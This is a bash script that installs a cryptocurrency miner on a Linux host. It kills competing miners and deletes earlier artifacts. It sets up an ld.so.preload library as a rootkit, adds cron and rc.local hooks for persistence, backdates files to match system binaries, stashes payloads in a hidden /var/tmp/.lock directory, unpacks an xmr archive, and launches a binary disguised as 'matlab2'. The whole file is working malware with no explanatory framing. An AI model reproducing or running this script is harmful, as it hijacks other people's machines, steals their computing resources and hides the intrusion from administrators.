#!/bin/bash
export PATH=$PATH:/usr/bin:/bin:/usr/local/bin:.:/usr:.
PATH=$PATH:/usr/bin:/bin:/usr/local/bin:.:/usr:.
threads=`grep -c "processor" /proc/cpuinfo`
sub="1"
mul="3"
thr=$(($threads - $sub))
thr2=$(($threads - 3))
thruse=$(($thr2 * 3))
/sbin/chkconfig crond on 2>/dev/null
/etc/rc.d/init.d/crond restart 2>/dev/null
/etc/init.d/cron restart 2>/dev/null
chattr -ai /tmp/fifo 2>/dev/null
rm -rf /tmp/fifo 2>/dev/null
mv aes.tgz /usr/lib/liboa.c 2>/dev/null
touch -acmr /bin/login /usr/lib/liboa.c 2>/dev/null
mkdir /var/tmp 2>/dev/null
mkdir /var/tmp/.lock 2>/dev/null
echo $thr2 > /var/tmp/.lock/tca.c 2>/dev/null
mv -f aes /var/tmp/.lock/cpa.h 2>/dev/null
rm -rf /var/tmp/.lock/tca.h 2>/dev/null
cat /etc/rc.d/rc.local|grep -v "ld.so.preload" > /tmp/l;mv /tmp/l /etc/rc.d/rc.local; 2>/dev/null
chmod +x /etc/rc.d/rc.local 2>/dev/null
sed -i '2i/usr/bin/chattr -ai /etc/ld.so.preload;/bin/rm /etc/ld.so.preload' /etc/rc.d/rc.local 2>/dev/null
touch -acmr /bin/login /etc/rc.d/rc.local 2>/dev/null
chattr -ai /etc/ld.so.preload 2>/dev/null
chattr -ai /lib64/sslibs.so 2>/dev/null
chattr -ai /usr/lib64/sslibs.so 2>/dev/null
chattr -ai /usr/lib64/library1.so 2>/dev/null
chattr -ai /lib64/library1.so 2>/dev/null
rm -rf /etc/ld.so.preload 2>/dev/null
rm -rf /lib64/sslibs.so 2>/dev/null
rm -rf /usr/lib64/sslibs.so 2>/dev/null
rm -rf  /usr/lib64/library1.so 2>/dev/null
rm -rf /lib64/library1.so 2>/dev/null
pkill -9 clusterlog 2>/dev/null
pkill -9 clusterc 2>/dev/null
pkill -9 htral 2>/dev/null
chattr -ai /var/tmp/.lock/cpa.h 2>/dev/null
chattr -ai /var/tmp/.lock/libvo 2>/dev/null
chattr -ai /var/tmp/.lock/ologs 2>/dev/null
chattr -ai /var/tmp/.lock/geolog 2>/dev/null
chattr -ai /etc/cron.hourly/sysmon 2>/dev/null
chattr -ai /usr/bin/gpdaemon 2>/dev/null
rm /etc/cron.daily/logr 2>/dev/null
rm /etc/cron.hourly/sysmon 2>/dev/null 
mkdir /var/tmp/.lock/lib 2>/dev/null
mv -f check_time /usr/bin 2>/dev/null
mv -f config.txt /var/tmp/.lock/ 2>/dev/null
mv -f cpu.txt /var/tmp/.lock 2>/dev/null
mv -f logr /usr/bin/sysmon 2>/dev/null
mv -f sys /usr/bin/gpdaemon 2>/dev/null
mv -f xmr.tgz /var/tmp/.lock/lib 2>/dev/null
mv -f realtime /var/tmp/.lock/libvo 2>/dev/null
mv -f hdshare /var/tmp/.lock/ologs 2>/dev/null
mv -f count.sh /var/tmp/.lock/geolog 2>/dev/null
cat /etc/cron.hourly/0anacron|grep -v check > /tmp/lal 2>/dev/null
mv /tmp/lal /etc/cron.hourly/0anacron 2>/dev/null
touch -acmr /bin/login /etc/cron.hourly/0anacron 2>/dev/null
chmod +x /etc/cron.hourly/0anacron 2>/dev/null
touch /etc/cron.hourly/0anacron 2>/dev/null
echo "#check" >>/etc/cron.hourly/0anacron 2>/dev/null
sed -i '1i/usr/bin/check_time >/dev/null 2>&1' /etc/cron.hourly/0anacron 2>/dev/null
chmod +x /etc/cron.hourly/0anacron 2>/dev/null
touch -acmr /bin/login /etc/cron.hourly/0anacron 2>/dev/null
mkdir /lib64 2>/dev/null
mkdir /usr/lib64 2>/dev/null
cp -f sslibs.so /lib64/library1.so 2>/dev/null
mv -f sslibs.so /usr/lib64/library1.so 2>/dev/null
echo "/lib64/library1.so" >/etc/ld.so.preload 2>/dev/null
chattr -ai /etc/ld.ba 2>/dev/null
cp /etc/ld.so.preload /etc/ld.ba 2>/dev/null
chmod 777 /etc/ld.so.preload 2>/dev/null
chmod 777 /lib64/library1.so 2>/dev/null
chmod 777 /usr/lib64/library1.so 2>/dev/null
rm -rf run 2>/dev/null
rm -rf runc 2>/dev/null
rm -rf realtime 2>/dev/null
rm -rf s 2>/dev/null
rm -rf time 2>/dev/null
rm -rf logr 2>/dev/null
rm -rf rund 2>/dev/null
rm -rf aes* 2>/dev/null
rm -rf noaes* 2>/dev/null
rm -rf rt 2>/dev/null
rm -rf count.sh 2>/dev/null
rm -rf hdshare 2>/dev/null
touch -acmr /bin/sleep /var/tmp/.lock/geolog 2>/dev/null
touch -acmr /bin/sleep /var/tmp/.lock/libvo 2>/dev/null
touch -acmr /bin/ps /var/tmp/.lock/ologs 2>/dev/null
touch -acmr /usr/bin/top /var/tmp/.lock/cpa.h 2>/dev/null
touch -acmr /bin/login /var/tmp/.lock/geolog 2>/dev/null
touch -acmr /bin/login /usr/bin/gpdaemon 2>/dev/null
touch -acmr /bin/ping /usr/bin/check_time 2>/dev/null
touch -acmr /bin/ping /usr/bin/sysmon 2>/dev/null
/usr/bin/killall -9 "matlab2" 2>/dev/null
/usr/bin/killall -9 "matlab3" 2>/dev/null
rm -rf /tmp/.X11fss 2>/dev/null
tar xfvz /var/tmp/.lock/lib/xmr.tgz -C /var/tmp/.lock/lib/ 2>/dev/null
/usr/bin/killall -9 "matlab2" 2>/dev/null
chattr -ai /tmp/matlab2 2>/dev/null
cp /var/tmp/.lock/ologs /tmp/matlab2 2>/dev/null
/usr/bin/nohup "/tmp/matlab2" &>/dev/null &

kill -9 $$ 2>/dev/null
